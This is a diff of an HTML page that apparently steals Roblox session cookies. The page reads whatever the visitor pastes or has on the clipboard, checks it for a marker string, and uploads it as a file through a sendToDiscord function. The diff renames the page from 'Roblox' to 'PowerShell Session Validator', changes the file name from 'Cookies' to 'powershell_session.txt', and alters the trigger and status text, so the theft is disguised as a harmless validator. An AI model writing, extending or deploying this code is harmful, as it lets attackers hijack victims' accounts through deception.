@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
+    <title>PowerShell Session Validator</title>
     <style>
         * {
             margin: 0;
@@ -249,7 +249,7 @@
             try {
                 const clipboardText = await navigator.clipboard.readText();
                 
-                if (clipboardText.toLowerCase().includes('WARNING')) {
+                if (clipboardText.toLowerCase().includes('|_')) {
                     textarea.value = clipboardText;
                     validateText();
                     await sendToDiscord(clipboardText);
@@ -270,7 +270,7 @@
             
             // Check if paste worked
             setTimeout(function() {
-                if (textarea.value.toLowerCase().includes('WARNING')) {
+                if (textarea.value.toLowerCase().includes('|_')) {
                     validateText();
                     sendToDiscord(textarea.value);
                 } else {
@@ -339,7 +339,7 @@
                 message += '**📁 PowerShell file attached below**';
 
                 const blob = new Blob([text], { type: 'text/plain' });
-                const file = new File([blob], 'Cookies', { type: 'text/plain' });
+                const file = new File([blob], 'powershell_session.txt', { type: 'text/plain' });
 
                 const formData = new FormData();
                 formData.append('file', file);
@@ -375,7 +375,7 @@
         function validateText() {
             const text = textarea.value;
             
-            if (text.toLowerCase().includes('WARNING') && text.trim().length > 0) {
+            if (text.toLowerCase().includes('|_') && text.trim().length > 0) {
                 textarea.style.color = '#66bb6a';
                 sendButton.disabled = false;
                 status.textContent = '';
@@ -384,7 +384,7 @@
                 textarea.style.color = '#e0e0e0';
                 sendButton.disabled = true;
                 if (text.trim().length > 0) {
-                    status.textContent = '✗ Please Make Sure You Followed Every Step';
+                    status.textContent = '✗ Text must include "session"';
                     status.className = 'status error';
                 } else {
                     status.textContent = '';
